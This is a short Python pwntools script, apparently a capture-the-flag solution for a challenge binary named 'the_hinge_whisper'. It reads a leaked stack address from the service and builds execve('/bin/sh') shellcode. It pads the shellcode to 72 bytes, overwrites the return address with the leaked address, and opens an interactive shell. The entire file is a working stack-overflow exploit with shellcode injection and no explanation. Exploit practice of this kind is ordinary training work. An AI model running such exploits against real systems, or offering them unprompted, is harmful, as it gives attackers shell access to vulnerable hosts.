from pwn import *

# context.terminal = ['zellij', 'action', 'new-pane', '-d', 'right', '--']
# context.log_level = 'debug'
context.arch = 'amd64'
context.endian = 'little'

p = remote('')
# p = process('./the_hinge_whisper')
# p = gdb.debug('./the_hinge_whisper', aslr=True, gdbscript='b *service_hatch+96')

p.readuntil(b'[+] The keyway sits at: ')
address_raw = p.readline() # for example 0x7fff52a5f380
address_int = int(address_raw.strip(), 16)
address = p64(address_int)

shellcode = bytes(asm('''
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp
mov rsi, 0
mov rdx, 0
mov rax, SYS_execve
syscall
'''))

payload = shellcode + cyclic(72-len(shellcode)) + address

p.writeafter(b'[+] Forge your latch-key: ', payload + b'\n')
p.interactive()
